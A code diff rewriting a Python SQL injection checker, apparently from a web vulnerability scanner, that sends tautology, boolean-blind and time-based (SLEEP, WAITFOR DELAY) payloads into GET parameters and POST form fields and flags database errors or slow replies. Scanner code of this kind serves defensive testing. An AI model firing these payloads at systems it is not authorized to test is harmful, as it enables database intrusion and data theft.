@@ -1,139 +1,212 @@
-import time, urllib.parse as up, requests
-ERROR_SIGNS = ["SQL syntax","SQLSTATE[","Unclosed quotation mark","near '","unterminated","pg_query","PDOException","ORA-"]
+import re
+import urllib.parse
+import time
 
-def _with_param(url, key, val):
-    pr = up.urlparse(url); qs = dict(up.parse_qsl(pr.query)); qs[key] = val
-    return up.urlunparse((pr.scheme, pr.netloc, pr.path, pr.params, up.urlencode(qs, doseq=True), pr.fragment))
+def sqli_payloads(base_payloads=None):
+    """
+    Generate SQL injection payloads including:
+    - classic tautologies
+    - boolean-based blind
+    - time-based (lightweight, optional)
+    """
+    if base_payloads is None:
+        base_payloads = [
+            "' OR '1'='1",
+            "\" OR \"1\"=\"1",
+            "' OR 1=1--",
+            "\" OR 1=1--",
+            "' OR 'a'='a",
+            "' OR ''='",
+        ]
+
+    out = list(base_payloads)
+
+    # Boolean-based blind payloads
+    blind_payloads = [
+        "' AND '1'='1",
+        "' AND '1'='2",
+        "\" AND \"1\"=\"1",
+        "\" AND \"1\"=\"2",
+        "' OR 1=1#",
+        "' OR 1=2#",
+    ]
+    out.extend(blind_payloads)
+
+    # Time-based blind (limited, safe)
+    time_payloads = [
+        "' OR SLEEP(2)--",
+        "\" OR SLEEP(2)--",
+        "'; WAITFOR DELAY '0:0:2'--",
+    ]
+    out.extend(time_payloads)
+
+    # Deduplicate
+    seen = set()
+    res = []
+    for p in out:
+        if p not in seen:
+            seen.add(p)
+            res.append(p)
+    return res
+
 
 class SQLiCheck:
-    @staticmethod
-    def run(http, params_map):
+    """SQL Injection vulnerability checker."""
+
+    SQLI_PAYLOADS = sqli_payloads()
+
+    ERROR_PATTERNS = [
+        re.compile(r"you have an error in your sql syntax", re.I),
+        re.compile(r"warning.*mysql", re.I),
+        re.compile(r"unclosed quotation mark after the character string", re.I),
+        re.compile(r"quoted string not properly terminated", re.I),
+        re.compile(r"syntax error.*sql", re.I),
+        re.compile(r"mysql_fetch", re.I),
+        re.compile(r"ORA-\d+", re.I),
+        re.compile(r"SQLITE_ERROR", re.I),
+    ]
+
+    @classmethod
+    def run(cls, http, params_map):
+        """Test GET parameters for SQLi vulnerabilities."""
         findings = []
-        for url, params in params_map.items():
-            for p in params:
-                # -------- Error-based (GET) --------
-                try:
-                    r = http.get(_with_param(url, p, "1'"))
-                    body = r.text or ""
-                    if any(sig.lower() in body.lower() for sig in ERROR_SIGNS):
-                        findings.append({
-                            "type":"sqli:error-based-get","url":url,"param":p,
-                            "payload":"1'","evidence":"Pesan error SQL terdeteksi.","severity_score":6
-                        })
-                except requests.RequestException:
-                    pass
 
-                # -------- Time-based (GET) --------
-                try:
-                    t0=time.time(); http.get(_with_param(url,p,"1")); base=time.time()-t0
-                    t1=time.time(); http.get(_with_param(url,p,"1 AND SLEEP(3)")); slow=time.time()-t1
-                    if slow-base>2.5:
-                        t2=time.time(); http.get(_with_param(url,p,"1 AND SLEEP(3)")); slow2=time.time()-t2
-                        if slow2-base>2.5:
-                            findings.append({
-                                "type":"sqli:time-based","url":url,"param":p,
-                                "payload":"1 AND SLEEP(3)","evidence":f"Latency naik signifikan (~{round(slow,2)}s).","severity_score":7
-                            })
-                except requests.RequestException:
-                    pass
+        for url, param_names in params_map.items():
+            for param in param_names:
+                findings.extend(cls._test_parameter(http, url, param))
 
-                # -------- Error-based (POST sederhana ke URL yg sama) --------
-                try:
-                    post_data = {p: "1'"}
-                    r = http.post(url, data=post_data)
-                    body = r.text or ""
-                    if any(sig.lower() in body.lower() for sig in ERROR_SIGNS):
-                        findings.append({
-                            "type":"sqli:error-based-post","url":url,"param":p,
-                            "payload":"1'","evidence":"POST SQLi detected","severity_score":6
-                        })
-                except (requests.RequestException, AttributeError):
-                    pass
         return findings
 
+    @classmethod
+    def run_forms(cls, http, forms):
+        """Test POST forms for SQLi vulnerabilities."""
+        findings = []
 
-# =========================
-# Tambahan: SQLi via POST forms (baru)
-# =========================
+        for form in forms:
+            if form["method"].upper() == "POST":
+                findings.extend(cls._test_form(http, form))
 
-def _looks_like_csrf(name: str) -> bool:
-    n = name.lower()
-    return ("csrf" in n) or ("xsrf" in n) or ("authenticity_token" in n)
+        return findings
 
-def run_forms(http, forms):
-    """
-    Uji SQLi di FORM POST:
-    - Hidden/CSRF token dipertahankan agar submit tidak gagal.
-    - Pilih satu field non-hidden sebagai target injeksi.
-    - Lakukan error-based & time-based test.
-    """
-    findings = []
-    for f in forms:
-        if f.get("method") != "POST":
-            continue
+    @classmethod
+    def _test_parameter(cls, http, url, param_name):
+        """Test a specific GET parameter for SQLi."""
+        findings = []
 
-        # Siapkan payload baseline: hidden/CSRF -> value asli, non-hidden -> "1"
-        base = {}
-        non_hidden = []
-        for inp in f.get("inputs", []):
-            name = inp["name"]
-            if inp["hidden"] or _looks_like_csrf(name):
-                base[name] = inp["value"]
-            else:
-                base[name] = "1"
-                non_hidden.append(name)
+        for payload in cls.SQLI_PAYLOADS:
+            try:
+                parsed = urllib.parse.urlparse(url)
+                query_params = urllib.parse.parse_qs(parsed.query)
 
-        if not non_hidden:
-            continue
-        target = non_hidden[0]  # ambil satu field untuk injeksi sederhana
+                query_params[param_name] = [payload]
+                new_query = urllib.parse.urlencode(query_params, doseq=True)
 
-        # -------- Error-based (POST FORM) --------
-        eb = dict(base)
-        eb[target] = "1'"
-        try:
-            r = http.post(f["action"], data=eb)
-            body = r.text or ""
-            if any(sig.lower() in body.lower() for sig in ERROR_SIGNS):
-                findings.append({
-                    "type": "sqli:error-based-post-form",
-                    "url": f["action"],
-                    "param": target,
-                    "payload": "1'",
-                    "evidence": "Pesan error SQL terdeteksi pada response.",
-                    "severity_score": 6
-                })
-        except requests.RequestException:
-            pass
+                test_url = urllib.parse.urlunparse((
+                    parsed.scheme, parsed.netloc, parsed.path,
+                    parsed.params, new_query, parsed.fragment
+                ))
 
-        # -------- Time-based (POST FORM) --------
-        try:
-            # baseline
-            t0 = time.time(); http.post(f["action"], data=base); t_base = time.time() - t0
+                start = time.time()
+                response = http.get(test_url)
+                elapsed = time.time() - start
 
-            tb = dict(base); tb[target] = "1 AND SLEEP(3)"
-            t1 = time.time(); http.post(f["action"], data=tb); t_slow = time.time() - t1
-
-            if t_slow - t_base > 2.5:
-                # konfirmasi kedua
-                t2 = time.time(); http.post(f["action"], data=tb); t_slow2 = time.time() - t2
-                if t_slow2 - t_base > 2.5:
+                if cls._is_vulnerable(response, elapsed):
                     findings.append({
-                        "type": "sqli:time-based-post-form",
-                        "url": f["action"],
-                        "param": target,
-                        "payload": "1 AND SLEEP(3)",
-                        "evidence": f"Latency naik signifikan (~{round(t_slow,2)}s).",
-                        "severity_score": 7
+                        "type": "SQL Injection (GET)",
+                        "severity": "CRITICAL",
+                        "url": test_url,
+                        "parameter": param_name,
+                        "payload": payload,
+                        "evidence": cls._extract_evidence(response.text),
+                        "description": f"SQL Injection vulnerability found in parameter '{param_name}'. "
+                                     f"The application directly includes user input in SQL queries.",
+                        "recommendation": "Use parameterized queries (prepared statements), input validation, "
+                                       "and proper escaping to prevent SQL injection."
                     })
-        except requests.RequestException:
-            pass
+                    break
 
-        
+            except Exception:
+                continue
 
-    return findings
+        return findings
 
-# --- compatibility shim: expose module-level run_forms as a staticmethod on SQLiCheck
-try:
-    SQLiCheck.run_forms
-except AttributeError:
-    SQLiCheck.run_forms = staticmethod(run_forms)
+    @classmethod
+    def _test_form(cls, http, form):
+        """Test a POST form for SQLi vulnerabilities."""
+        findings = []
+
+        for input_field in form["inputs"]:
+            if input_field["hidden"]:
+                continue
+
+            param_name = input_field["name"]
+
+            for payload in cls.SQLI_PAYLOADS:
+                try:
+                    data = {}
+                    for inp in form["inputs"]:
+                        if inp["name"] == param_name:
+                            data[inp["name"]] = payload
+                        else:
+                            data[inp["name"]] = inp["value"]
+
+                    start = time.time()
+                    response = http.post(form["action"], data=data)
+                    elapsed = time.time() - start
+
+                    if cls._is_vulnerable(response, elapsed):
+                        findings.append({
+                            "type": "SQL Injection (POST)",
+                            "severity": "CRITICAL",
+                            "url": form["action"],
+                            "form_page": form["page"],
+                            "parameter": param_name,
+                            "payload": payload,
+                            "evidence": cls._extract_evidence(response.text),
+                            "description": f"SQL Injection vulnerability found in form parameter '{param_name}'. "
+                                         f"The application directly includes user input in SQL queries.",
+                            "recommendation": "Use parameterized queries (prepared statements), input validation, "
+                                           "and proper escaping to prevent SQL injection."
+                        })
+                        break
+
+                except Exception:
+                    continue
+
+        return findings
+
+    @classmethod
+    def _is_vulnerable(cls, response, elapsed=0):
+        """Check if response indicates SQLi vulnerability."""
+        if not response or not response.text:
+            return False
+
+        for pattern in cls.ERROR_PATTERNS:
+            if pattern.search(response.text):
+                return True
+
+        # Time-based detection heuristic
+        if elapsed > 1.5:  # threshold ~2s payloads
+            return True
+
+        return False
+
+    @classmethod
+    def _extract_evidence(cls, response_text):
+        """Extract relevant evidence from response."""
+        if not response_text:
+            return "No response text"
+
+        for pattern in cls.ERROR_PATTERNS:
+            match = pattern.search(response_text)
+            if match:
+                start = max(0, match.start() - 50)
+                end = min(len(response_text), match.end() + 50)
+                return response_text[start:end].strip()
+
+        lines = response_text.split('\n')
+        for line in lines:
+            if any(word in line.lower() for word in ["sql", "mysql", "syntax", "error"]):
+                return line.strip()[:200]
+
+        return "Potential SQL Injection vulnerability detected"
